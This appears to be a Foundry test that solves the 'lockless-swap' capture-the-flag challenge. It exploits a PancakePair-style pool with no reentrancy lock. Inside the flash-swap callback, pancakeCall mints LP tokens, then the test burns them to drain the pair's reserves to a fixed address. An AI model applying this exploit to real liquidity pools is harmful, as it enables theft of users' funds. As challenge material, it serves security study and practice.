// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/lockless-swap/Challenge.sol";

contract locklessTest is Test {
    Challenge public challenge;
    ERC20 public token0;
    ERC20 public token1;
    PancakePair public pair;
    address public user = makeAddr("user");
    address public deployer = makeAddr("deployer");

    function setUp() public {
        vm.startPrank(deployer);
        challenge = new Challenge();
        token0 = challenge.token0();
        token1 = challenge.token1();
        pair = challenge.pair();
        vm.stopPrank();
    }

    function testlockless() public {
        pair.getReserves();
        token1.balanceOf(address(0xf2331a2d));
        challenge.faucet();
        console.log("token0 balance first: %e", token0.balanceOf(address(this)));
        console.log("token1 balance first: %e", token1.balanceOf(address(this)));

        pair.swap(99e18 - 1e10, 99e18 - 1e10, address(this), "123");
        console.log("LpToken: %e", pair.balanceOf(address(this)));
        console.log("my token0 balance:%e", token0.balanceOf(address(this)));
        console.log("my token1 balance:%e", token1.balanceOf(address(this)));
        console.log("my pair balance:%e", pair.balanceOf(address(this)));
        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(0xf2331a2d));
        console.log("folk token0 balance:%e", token0.balanceOf(address(0xf2331a2d)));
        console.log("folk token1 balance:%e", token0.balanceOf(address(0xf2331a2d)));
        challenge.isSolved();
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("pair balance 0:%e", token0.balanceOf(address(pair)));
        console.log("pair balance 1:%e", token1.balanceOf(address(pair)));

        token0.transfer(address(pair), 1e18);
        token1.transfer(address(pair), 1e18);
        pair.mint(address(this));
        token0.transfer(address(pair), 99e18 - 1e10);
        token1.transfer(address(pair), 99e18 - 1e10);
    }
}
